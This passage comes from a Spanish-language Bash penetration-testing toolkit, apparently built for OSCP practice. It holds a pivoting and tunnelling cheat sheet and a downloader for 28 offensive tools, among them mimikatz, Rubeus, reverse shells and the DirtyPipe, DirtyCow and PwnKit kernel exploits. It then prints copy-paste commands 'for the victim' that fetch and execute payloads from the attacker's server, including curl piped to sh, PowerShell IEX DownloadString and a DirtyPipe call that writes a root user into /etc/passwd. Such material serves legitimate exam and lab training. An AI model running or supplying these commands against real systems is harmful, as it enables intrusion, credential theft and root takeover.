    echo -e "  ${WHITE}Port Forward:${NC}    ${YELLOW}./chisel client ${my_ip}:8888 R:LPORT:127.0.0.1:RPORT${NC}"
    echo -e "  ${WHITE}SOCKS Proxy:${NC}     ${YELLOW}./chisel client ${my_ip}:8888 R:socks${NC}  ${DIM}(→ 1080)${NC}"
    echo ""
    echo -e "  ${LCYAN}${BOLD}--- LIGOLO-NG ---${NC}"
    echo -e "  ${WHITE}Kali setup:${NC}      ${YELLOW}sudo ip tuntap add user \$(whoami) mode tun dev ligolo${NC}"
    echo -e "  ${WHITE}                 ${YELLOW}sudo ip link set ligolo up${NC}"
    echo -e "  ${WHITE}Proxy (Kali):${NC}    ${YELLOW}./proxy -selfcert -laddr 0.0.0.0:11601${NC}"
    echo -e "  ${WHITE}Agent (Víctima):${NC} ${YELLOW}./agent -connect ${my_ip}:11601 -ignore-cert${NC}"
    echo -e "  ${WHITE}Consola ligolo:${NC}  ${YELLOW}session${NC} → ${YELLOW}ifconfig${NC} → ${YELLOW}start${NC}"
    echo -e "  ${WHITE}Ruta (Kali):${NC}     ${YELLOW}sudo ip route add 10.X.X.0/24 dev ligolo${NC}"
    echo ""
    echo -e "  ${LCYAN}${BOLD}--- SOCAT ---${NC}"
    echo -e "  ${WHITE}Relay:${NC}           ${YELLOW}socat tcp-l:LPORT,fork tcp:TARGET:RPORT${NC}"
    echo ""
    echo -e "  ${LCYAN}${BOLD}--- PROXYCHAINS ---${NC}"
    echo -e "  ${WHITE}Config:${NC}          ${YELLOW}sudo nano /etc/proxychains4.conf${NC}"
    echo -e "  ${WHITE}Añadir:${NC}          ${YELLOW}socks5 127.0.0.1 1080${NC}"
    echo -e "  ${WHITE}Usar:${NC}            ${YELLOW}proxychains COMANDO${NC}"
    echo -e "  ${DIM}  ⚠️  Siempre -sT con nmap (nunca -sS)${NC}"
    echo -e "  ${DIM}  ⚠️  Siempre -Pn (ping no funciona por proxy)${NC}"
    echo -e "  ${DIM}  ⚠️  Firefox: Preferences → Proxy → SOCKS5 → 127.0.0.1:1080${NC}"
    echo ""
    echo -e "  ${LCYAN}${BOLD}--- WINDOWS NATIVO ---${NC}"
    echo -e "  ${WHITE}Netsh:${NC}           ${YELLOW}netsh interface portproxy add v4tov4 listenport=LPORT listenaddress=0.0.0.0 connectport=RPORT connectaddress=TARGET${NC}"
    echo -e "  ${WHITE}Plink:${NC}           ${YELLOW}plink.exe -l user -pw PASS -R LPORT:127.0.0.1:RPORT KALI_IP${NC}"
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"

    echo ""
    echo -e "  ${DIM}¿Necesitas descargar chisel/ligolo/socat/plink? → [BIN] Binary Arsenal${NC}"
    echo ""; read -rp "  Presiona ENTER para continuar..."
}

# =============================================================================
# -- [BIN] Binary Arsenal -> Centralized Payload Downloader ---------------------
# =============================================================================
binary_arsenal() {
    banner
    log_section "BINARY ARSENAL — Payload Downloader"

    require_loot || return

    local bin_dir="$LOOT_DIR/binaries"
    mkdir -p "$bin_dir"

    local my_ip
    my_ip=$(get_attacker_ip)

    echo ""
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${BOLD}🎯 BINARY ARSENAL -> OSCP Payload Hub${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}Carpeta: $bin_dir${NC}"
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
    echo ""
    echo -e "  ${LCYAN}${BOLD}--- 🪟 CAT.1: WINDOWS PRIVESC ---${NC}"
    echo -e "  ${WHITE} [1]${NC}  winPEASx64.exe        ${DIM}Enum escalada Windows x64${NC}"
    echo -e "  ${WHITE} [2]${NC}  winPEASany.exe        ${DIM}WinPEAS .NET 2.0 (Win7/2008)${NC}"
    echo -e "  ${WHITE} [3]${NC}  Seatbelt.exe          ${DIM}Enum seguridad Windows (GhostPack)${NC}"
    echo -e "  ${WHITE} [4]${NC}  PrintSpoofer64.exe    ${DIM}SeImpersonatePriv → SYSTEM${NC}"
    echo -e "  ${WHITE} [5]${NC}  GodPotato-NET4.exe    ${DIM}Potato moderno (Server 2012-2022)${NC}"
    echo -e "  ${WHITE} [6]${NC}  JuicyPotatoNG.exe     ${DIM}Potato clásico actualizado${NC}"
    echo -e "  ${WHITE} [7]${NC}  nc64.exe              ${DIM}Netcat estático Windows${NC}"
    echo -e "  ${WHITE} [8]${NC}  PowerUp.ps1           ${DIM}Caza misconfigs servicios (PowerSploit)${NC}"
    echo -e "  ${WHITE} [9]${NC}  accesschk64.exe       ${DIM}Permisos servicios (Sysinternals)${NC}"
    echo ""
    echo -e "  ${LCYAN}${BOLD}--- 🏢 CAT.2: ACTIVE DIRECTORY ---${NC}"
    echo -e "  ${WHITE}[10]${NC}  mimikatz.exe          ${DIM}Volcar hashes, tickets, passwords${NC}"
    echo -e "  ${WHITE}[11]${NC}  Rubeus.exe            ${DIM}Kerberoast, AS-REP, Pass-the-Ticket${NC}"
    echo -e "  ${WHITE}[12]${NC}  SharpHound.exe        ${DIM}Colector BloodHound (mapear AD)${NC}"
    echo -e "  ${WHITE}[13]${NC}  Invoke-Mimikatz.ps1   ${DIM}Mimikatz en memoria (PowerShell)${NC}"
    echo ""
    echo -e "  ${LCYAN}${BOLD}--- 🐧 CAT.3: LINUX PRIVESC ---${NC}"
    echo -e "  ${WHITE}[14]${NC}  linpeas.sh            ${DIM}Enum escalada Linux${NC}"
    echo -e "  ${WHITE}[15]${NC}  pspy64                ${DIM}Espía procesos sin root (cronjobs)${NC}"
    echo -e "  ${WHITE}[16]${NC}  pspy32                ${DIM}pspy para 32 bits${NC}"
    echo -e "  ${WHITE}[17]${NC}  lse.sh                ${DIM}Linux Smart Enumeration (ligera)${NC}"
    echo ""
    echo -e "  ${LCYAN}${BOLD}--- 🔀 CAT.4: PIVOTING Y TÃšNELES ---${NC}"
    echo -e "  ${WHITE}[18]${NC}  chisel (Linux)        ${DIM}Túnel HTTP inverso Linux${NC}"
    echo -e "  ${WHITE}[19]${NC}  chisel.exe (Win)      ${DIM}Túnel HTTP inverso Windows${NC}"
    echo -e "  ${WHITE}[20]${NC}  ligolo-agent (Linux)  ${DIM}Agente Ligolo-ng Linux${NC}"
    echo -e "  ${WHITE}[21]${NC}  ligolo-agent.exe (Win)${DIM} Agente Ligolo-ng Windows${NC}"
    echo -e "  ${WHITE}[22]${NC}  socat (estático)      ${DIM}Redirección de puertos rápida${NC}"
    echo -e "  ${WHITE}[23]${NC}  plink.exe             ${DIM}SSH PuTTY CLI (port forward Win)${NC}"
    echo ""
    echo -e "  ${LCYAN}${BOLD}--- 🐚 CAT.5: REVERSE SHELLS ---${NC}"
    echo -e "  ${WHITE}[24]${NC}  Invoke-PowerShellTcp.ps1  ${DIM}RevShell PS estable (Nishang)${NC}"
    echo -e "  ${WHITE}[25]${NC}  php-reverse-shell.php     ${DIM}Webshell PHP (PentestMonkey)${NC}"
    echo ""
    echo -e "  ${LCYAN}${BOLD}--- ⚡ CAT.6: KERNEL EXPLOITS ---${NC}"
    echo -e "  ${WHITE}[26]${NC}  dirtypipe.c (CVE-2022-0847)  ${DIM}Kernel 5.8+ → root${NC}"
    echo -e "  ${WHITE}[27]${NC}  dirty.c (CVE-2016-5195)      ${DIM}DirtyCow kernel =4.8 -> root${NC}"
    echo -e "  ${WHITE}[28]${NC}  PwnKit (CVE-2021-4034)       ${DIM}polkit pkexec → root${NC}"
    echo ""
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
    echo -e "  ${LGREEN}${BOLD}  CATEGORÍAS COMPLETAS:${NC}"
    echo -e "  ${WHITE} [W]${NC}   Descargar toda Cat.1 (Windows PrivEsc)"
    echo -e "  ${WHITE} [DA]${NC}  Descargar toda Cat.2 (Active Directory)"
    echo -e "  ${WHITE} [LX]${NC}  Descargar toda Cat.3 (Linux PrivEsc)"
    echo -e "  ${WHITE} [PIV]${NC} Descargar toda Cat.4 (Pivoting)"
    echo -e "  ${WHITE} [RS]${NC}  Descargar toda Cat.5 (Reverse Shells)"
    echo -e "  ${WHITE} [KE]${NC}  Descargar toda Cat.6 (Kernel Exploits)"
    echo -e "  ${LRED}${BOLD} [ALL]${NC}${LRED} Descargar TODO (28 binarios)${NC}"
    echo ""
    echo -e "  ${LGREEN}${BOLD}  SERVIDOR:${NC}"
    echo -e "  ${WHITE} [SRV]${NC} 🌐 Levantar HTTP server en $bin_dir"
    echo -e "  ${WHITE} [LS]${NC}  📋 Listar binarios descargados"
    echo -e "  ${WHITE} [b]${NC}   Volver"
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"
    echo ""
    read -rp "  $(echo -e "${CYAN}Opción:${NC} ")" bin_opt

    case $bin_opt in
        # -- Individual downloads --
        1)  _bin_download "winPEASx64.exe" \
                "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe" ;;
        2)  _bin_download "winPEASany.exe" \
                "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe" ;;
        3)  _bin_download "Seatbelt.exe" \
                "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe" ;;
        4)  _bin_download "PrintSpoofer64.exe" \
                "https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe" ;;
        5)  _bin_download "GodPotato-NET4.exe" \
                "https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe" ;;
        6)  _bin_download_zip "JuicyPotatoNG.exe" \
                "https://github.com/antonioCoco/JuicyPotatoNG/releases/latest/download/JuicyPotatoNG.zip" \
                "JuicyPotatoNG.exe" ;;
        7)  _bin_download "nc64.exe" \
                "https://github.com/int0x33/nc.exe/raw/master/nc64.exe" ;;
        8)  _bin_download "PowerUp.ps1" \
                "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" ;;
        9)  _bin_download "accesschk64.exe" \
                "https://live.sysinternals.com/accesschk64.exe" ;;
        10) _bin_download_zip "mimikatz.exe" \
                "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" \
                "x64/mimikatz.exe" ;;
        11) _bin_download "Rubeus.exe" \
                "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" ;;
        12) _bin_download_latest_zip "SharpHound.exe" \
                "BloodHoundAD/SharpHound" "SharpHound.exe" ;;
        13) _bin_download "Invoke-Mimikatz.ps1" \
                "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1" ;;
        14) _bin_download "linpeas.sh" \
                "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" ;;
        15) _bin_download "pspy64" \
                "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64" ;;
        16) _bin_download "pspy32" \
                "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32" ;;
        17) _bin_download "lse.sh" \
                "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" ;;
        18) _bin_download_chisel "linux" ;;
        19) _bin_download_chisel "windows" ;;
        20) _bin_download_ligolo "linux" ;;
        21) _bin_download_ligolo "windows" ;;
        22) _bin_download "socat" \
                "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" ;;
        23) _bin_download "plink.exe" \
                "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" ;;
        24) _bin_download "Invoke-PowerShellTcp.ps1" \
                "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" ;;
        25) _bin_download "php-reverse-shell.php" \
                "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" ;;
        26) _bin_download "dirtypipe.c" \
                "https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c" ;;
        27) _bin_download "dirty.c" \
                "https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c" ;;
        28) _bin_download "PwnKit" \
                "https://github.com/ly4k/PwnKit/releases/latest/download/PwnKit" ;;

        # -- Category downloads --
        w|W)
            log_info "Descargando Cat.1: Windows PrivEsc (9 binarios)..."
            for i in 1 2 3 4 5 6 7 8 9; do
                _bin_dispatch "$i"
            done ;;
        da|DA|Da)
            log_info "Descargando Cat.2: Active Directory (4 binarios)..."
            for i in 10 11 12 13; do
                _bin_dispatch "$i"
            done ;;
        lx|LX|Lx)
            log_info "Descargando Cat.3: Linux PrivEsc (4 binarios)..."
            for i in 14 15 16 17; do
                _bin_dispatch "$i"
            done ;;
        piv|PIV|Piv)
            log_info "Descargando Cat.4: Pivoting (6 binarios)..."
            for i in 18 19 20 21 22 23; do
                _bin_dispatch "$i"
            done ;;
        rs|RS|Rs)
            log_info "Descargando Cat.5: Reverse Shells (2 binarios)..."
            for i in 24 25; do
                _bin_dispatch "$i"
            done ;;
        ke|KE|Ke)
            log_info "Descargando Cat.6: Kernel Exploits (3 binarios)..."
            for i in 26 27 28; do
                _bin_dispatch "$i"
            done ;;
        all|ALL|All)
            log_info "Descargando TODOS los binarios (28)..."
            for i in $(seq 1 28); do
                _bin_dispatch "$i"
            done ;;

        # -- Server & utilities --
        srv|SRV|Srv) _bin_serve ;;
        ls|LS|Ls)    _bin_list ;;
        b|B) return ;;
        *)   log_warn "Opción no válida." ;;
    esac

    echo ""; read -rp "  Presiona ENTER para continuar..."
}

# -- Helper: direct download --------------------------------------------------
_bin_download() {
    local name="$1" url="$2"
    local bin_dir="$LOOT_DIR/binaries"
    mkdir -p "$bin_dir"

    if [[ -f "$bin_dir/$name" ]]; then
        local sz; sz=$(du -sh "$bin_dir/$name" 2>/dev/null | cut -f1)
        log_ok "$name ya existe ($sz) — omitiendo descarga."
        return 0
    fi

    log_info "Descargando $name..."
    if wget -q --show-progress --timeout=15 --tries=2 "$url" -O "$bin_dir/$name" 2>&1; then
        chmod +x "$bin_dir/$name" 2>/dev/null
        local sz; sz=$(du -sh "$bin_dir/$name" 2>/dev/null | cut -f1)
        log_ok "$name descargado ($sz)"
    else
        log_error "Fallo al descargar $name desde $url"
        rm -f "$bin_dir/$name" 2>/dev/null
    fi
}

# -- Helper: download zip and extract a specific file -------------------------
_bin_download_zip() {
    local name="$1" url="$2" inner_path="$3"
    local bin_dir="$LOOT_DIR/binaries"
    local tmp_zip="$bin_dir/_tmp_${name}.zip"
    mkdir -p "$bin_dir"

    if [[ -f "$bin_dir/$name" ]]; then
        local sz; sz=$(du -sh "$bin_dir/$name" 2>/dev/null | cut -f1)
        log_ok "$name ya existe ($sz) — omitiendo descarga."
        return 0
    fi

    log_info "Descargando $name (ZIP)..."
    if wget -q --show-progress --timeout=30 --tries=2 "$url" -O "$tmp_zip" 2>&1; then
        unzip -o -j "$tmp_zip" "$inner_path" -d "$bin_dir/" 2>/dev/null
        # Rename if necessary
        local extracted_name; extracted_name=$(basename "$inner_path")
        if [[ "$extracted_name" != "$name" && -f "$bin_dir/$extracted_name" ]]; then
            mv "$bin_dir/$extracted_name" "$bin_dir/$name" 2>/dev/null
        fi
        rm -f "$tmp_zip" 2>/dev/null
        chmod +x "$bin_dir/$name" 2>/dev/null
        local sz; sz=$(du -sh "$bin_dir/$name" 2>/dev/null | cut -f1)
        log_ok "$name extraído ($sz)"
    else
        log_error "Fallo al descargar $name"
        rm -f "$tmp_zip" 2>/dev/null
    fi
}

# -- Helper: download latest release zip from GitHub API ----------------------
_bin_download_latest_zip() {
    local name="$1" repo="$2" inner_path="$3"
    local bin_dir="$LOOT_DIR/binaries"
    mkdir -p "$bin_dir"

    if [[ -f "$bin_dir/$name" ]]; then
        local sz; sz=$(du -sh "$bin_dir/$name" 2>/dev/null | cut -f1)
        log_ok "$name ya existe ($sz) — omitiendo descarga."
        return 0
    fi

    log_info "Obteniendo última release de $repo..."
    local zip_url
    zip_url=$(curl -s "https://api.github.com/repos/$repo/releases/latest" 2>/dev/null \
        | grep -oP '"browser_download_url":\s*"\K[^"]+\.zip' | head -1)

    if [[ -z "$zip_url" ]]; then
        log_error "No se pudo obtener la URL de release para $repo"
        return 1
    fi

    _bin_download_zip "$name" "$zip_url" "$inner_path"
}

# -- Helper: download chisel (gz compressed) ----------------------------------
_bin_download_chisel() {
    local platform="$1" # "linux" or "windows"
    local bin_dir="$LOOT_DIR/binaries"
    mkdir -p "$bin_dir"

    local out_name="chisel"
    [[ "$platform" == "windows" ]] && out_name="chisel.exe"

    if [[ -f "$bin_dir/$out_name" ]]; then
        local sz; sz=$(du -sh "$bin_dir/$out_name" 2>/dev/null | cut -f1)
        log_ok "$out_name ya existe ($sz) — omitiendo."
        return 0
    fi

    local cv
    cv=$(curl -s https://api.github.com/repos/jpillora/chisel/releases/latest 2>/dev/null \
        | grep -oP '"tag_name":\s*"v?\K[^"]+')
    [[ -z "$cv" ]] && cv="1.10.1"

    local gz_url
    if [[ "$platform" == "linux" ]]; then
        gz_url="https://github.com/jpillora/chisel/releases/download/v${cv}/chisel_${cv}_linux_amd64.gz"
    else
        gz_url="https://github.com/jpillora/chisel/releases/download/v${cv}/chisel_${cv}_windows_amd64.gz"
    fi

    log_info "Descargando chisel $platform v$cv..."
    wget -q --show-progress "$gz_url" -O "$bin_dir/${out_name}.gz" 2>&1
    gunzip -f "$bin_dir/${out_name}.gz" 2>/dev/null
    chmod +x "$bin_dir/$out_name" 2>/dev/null
    local sz; sz=$(du -sh "$bin_dir/$out_name" 2>/dev/null | cut -f1)
    log_ok "$out_name descargado ($sz)"
}

# -- Helper: download ligolo-ng agent -----------------------------------------
_bin_download_ligolo() {
    local platform="$1" # "linux" or "windows"
    local bin_dir="$LOOT_DIR/binaries"
    mkdir -p "$bin_dir"

    local out_name="ligolo-agent"
    [[ "$platform" == "windows" ]] && out_name="ligolo-agent.exe"

    if [[ -f "$bin_dir/$out_name" ]]; then
        local sz; sz=$(du -sh "$bin_dir/$out_name" 2>/dev/null | cut -f1)
        log_ok "$out_name ya existe ($sz) — omitiendo."
        return 0
    fi

    local lv
    lv=$(curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest 2>/dev/null \
        | grep -oP '"tag_name":\s*"v?\K[^"]+')
    [[ -z "$lv" ]] && lv="0.7.5"

    log_info "Descargando ligolo-ng agent $platform v$lv..."
    if [[ "$platform" == "linux" ]]; then
        wget -q --show-progress \
            "https://github.com/nicocha30/ligolo-ng/releases/download/v${lv}/ligolo-ng_agent_${lv}_linux_amd64.tar.gz" \
            -O "$bin_dir/_ligolo_agent.tar.gz" 2>&1
        tar xzf "$bin_dir/_ligolo_agent.tar.gz" -C "$bin_dir/" 2>/dev/null
        # Rename extracted binary
        local found; found=$(find "$bin_dir" -maxdepth 1 -name "agent" -o -name "ligolo-ng_agent*" 2>/dev/null | head -1)
        [[ -n "$found" && "$found" != "$bin_dir/$out_name" ]] && mv "$found" "$bin_dir/$out_name" 2>/dev/null
        rm -f "$bin_dir/_ligolo_agent.tar.gz" 2>/dev/null
    else
        wget -q --show-progress \
            "https://github.com/nicocha30/ligolo-ng/releases/download/v${lv}/ligolo-ng_agent_${lv}_windows_amd64.zip" \
            -O "$bin_dir/_ligolo_agent.zip" 2>&1
        unzip -o -j "$bin_dir/_ligolo_agent.zip" -d "$bin_dir/" 2>/dev/null
        local found; found=$(find "$bin_dir" -maxdepth 1 -name "agent.exe" -o -name "ligolo-ng_agent*.exe" 2>/dev/null | head -1)
        [[ -n "$found" && "$found" != "$bin_dir/$out_name" ]] && mv "$found" "$bin_dir/$out_name" 2>/dev/null
        rm -f "$bin_dir/_ligolo_agent.zip" 2>/dev/null
    fi
    chmod +x "$bin_dir/$out_name" 2>/dev/null
    local sz; sz=$(du -sh "$bin_dir/$out_name" 2>/dev/null | cut -f1)
    log_ok "$out_name descargado ($sz)"
}

# -- Helper: dispatch by number (for category/ALL downloads) ------------------
_bin_dispatch() {
    local n="$1"
    case $n in
        1)  _bin_download "winPEASx64.exe" "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe" ;;
        2)  _bin_download "winPEASany.exe" "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe" ;;
        3)  _bin_download "Seatbelt.exe" "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe" ;;
        4)  _bin_download "PrintSpoofer64.exe" "https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe" ;;
        5)  _bin_download "GodPotato-NET4.exe" "https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe" ;;
        6)  _bin_download_zip "JuicyPotatoNG.exe" "https://github.com/antonioCoco/JuicyPotatoNG/releases/latest/download/JuicyPotatoNG.zip" "JuicyPotatoNG.exe" ;;
        7)  _bin_download "nc64.exe" "https://github.com/int0x33/nc.exe/raw/master/nc64.exe" ;;
        8)  _bin_download "PowerUp.ps1" "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" ;;
        9)  _bin_download "accesschk64.exe" "https://live.sysinternals.com/accesschk64.exe" ;;
        10) _bin_download_zip "mimikatz.exe" "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" "x64/mimikatz.exe" ;;
        11) _bin_download "Rubeus.exe" "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" ;;
        12) _bin_download_latest_zip "SharpHound.exe" "BloodHoundAD/SharpHound" "SharpHound.exe" ;;
        13) _bin_download "Invoke-Mimikatz.ps1" "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1" ;;
        14) _bin_download "linpeas.sh" "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" ;;
        15) _bin_download "pspy64" "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64" ;;
        16) _bin_download "pspy32" "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32" ;;
        17) _bin_download "lse.sh" "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" ;;
        18) _bin_download_chisel "linux" ;;
        19) _bin_download_chisel "windows" ;;
        20) _bin_download_ligolo "linux" ;;
        21) _bin_download_ligolo "windows" ;;
        22) _bin_download "socat" "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" ;;
        23) _bin_download "plink.exe" "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" ;;
        24) _bin_download "Invoke-PowerShellTcp.ps1" "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" ;;
        25) _bin_download "php-reverse-shell.php" "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" ;;
        26) _bin_download "dirtypipe.c" "https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c" ;;
        27) _bin_download "dirty.c" "https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c" ;;
        28) _bin_download "PwnKit" "https://github.com/ly4k/PwnKit/releases/latest/download/PwnKit" ;;
    esac
}

# -- Helper: serve binaries via HTTP ------------------------------------------
_bin_serve() {
    local bin_dir="$LOOT_DIR/binaries"
    local my_ip
    my_ip=$(get_attacker_ip)

    local file_count
    file_count=$(find "$bin_dir" -maxdepth 1 -type f 2>/dev/null | wc -l)
    if [[ "$file_count" -eq 0 ]]; then
        log_warn "No hay binarios descargados en $bin_dir. Descarga algo primero."
        return 1
    fi

    # Find free port (prefer 80, fallback to 8080, then 9090)
    local srv_port=80
    if ss -tlnp 2>/dev/null | grep -q ":80 "; then
        srv_port=8080
        if ss -tlnp 2>/dev/null | grep -q ":8080 "; then
            srv_port=9090
        fi
    fi

    log_info "Levantando HTTP server en puerto $srv_port..."
    tmux_run "BIN_HTTP" "cd $bin_dir && python3 -m http.server $srv_port" ""
    sleep 1

    echo ""
    echo -e "  ${LGREEN}${BOLD}✅ Servidor activo: http://$my_ip:$srv_port/${NC}"
    echo ""
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${BOLD}📋 COMANDOS COPY-PASTE PARA LA VÃCTIMA${NC}"
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- 🐧 LINUX TARGET ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}wget http://$my_ip:$srv_port/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}curl http://$my_ip:$srv_port/linpeas.sh | sh${NC}  ${DIM}-> file-less${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}wget http://$my_ip:$srv_port/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}wget http://$my_ip:$srv_port/chisel -O /tmp/chisel && chmod +x /tmp/chisel${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}wget http://$my_ip:$srv_port/socat -O /tmp/socat && chmod +x /tmp/socat${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- 🪟 WINDOWS TARGET (CMD) ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}certutil.exe -urlcache -f http://$my_ip:$srv_port/winPEASx64.exe C:\\Windows\\Temp\\wp.exe${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}certutil.exe -urlcache -f http://$my_ip:$srv_port/nc64.exe C:\\Windows\\Temp\\nc.exe${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}certutil.exe -urlcache -f http://$my_ip:$srv_port/mimikatz.exe C:\\Windows\\Temp\\mimi.exe${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}certutil.exe -urlcache -f http://$my_ip:$srv_port/chisel.exe C:\\Windows\\Temp\\chisel.exe${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- 🪟 WINDOWS TARGET (PowerShell) ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}iwr -uri http://$my_ip:$srv_port/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}IEX(New-Object Net.WebClient).DownloadString('http://$my_ip:$srv_port/PowerUp.ps1')${NC}  ${DIM}-> mem${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}IEX(New-Object Net.WebClient).DownloadString('http://$my_ip:$srv_port/Invoke-PowerShellTcp.ps1')${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- ⚡ KERNEL EXPLOITS (compilar en victima) ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}wget http://$my_ip:$srv_port/dirty.c && gcc dirty.c -o dirty -lcrypt -pthread && ./dirty${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}wget http://$my_ip:$srv_port/dirtypipe.c && gcc dirtypipe.c -o dp && ./dp /etc/passwd 1 '\\npiped:\$1\$piped\$piped:0:0::/root:/bin/bash'${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}wget http://$my_ip:$srv_port/PwnKit && chmod +x PwnKit && ./PwnKit${NC}  ${DIM}-> precompilado${NC}"
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"
}

# -- Helper: list downloaded binaries -----------------------------------------
_bin_list() {
    local bin_dir="$LOOT_DIR/binaries"
    echo ""
    log_info "Binarios descargados en $bin_dir:"
    echo ""
    if [[ -d "$bin_dir" ]] && ls "$bin_dir"/* &>/dev/null; then
        printf "  ${WHITE}%-30s %8s${NC}\n" "ARCHIVO" "TAMAÑO"
        echo "  ------------------------------------------"
        find "$bin_dir" -maxdepth 1 -type f -printf "%f\n" 2>/dev/null | sort | while read -r f; do
            local sz; sz=$(du -sh "$bin_dir/$f" 2>/dev/null | cut -f1)
            printf "  ${GREEN}%-30s${NC} %8s\n" "$f" "$sz"
        done
        echo ""
        local total; total=$(du -sh "$bin_dir" 2>/dev/null | cut -f1)
        echo -e "  ${CYAN}Total: $total${NC}"
    else
        log_warn "Carpeta vacía. Descarga binarios primero."
    fi
}

# =============================================================================
# -- [?] Hash Cracking Cheatsheet ---------------------------------------------
# =============================================================================
hashcrack_cheatsheet() {
    banner
    log_section "HASH CRACKING (hashcat / john)"

    echo ""
    echo -e "  ${LPURPLE}+----------------------------------------------------------------------+${NC}"
    echo -e "  ${LPURPLE}|  ${BOLD}🔓 HASH CRACKING -> Modos OSCP${NC}                                     ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|----------------------------------------------------------------------?${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- IDENTIFICAR ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}hashid 'HASH'${NC}    ${YELLOW}hash-identifier${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- HASHCAT ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}hashcat -m MODE hash.txt /usr/share/wordlists/rockyou.txt${NC}"
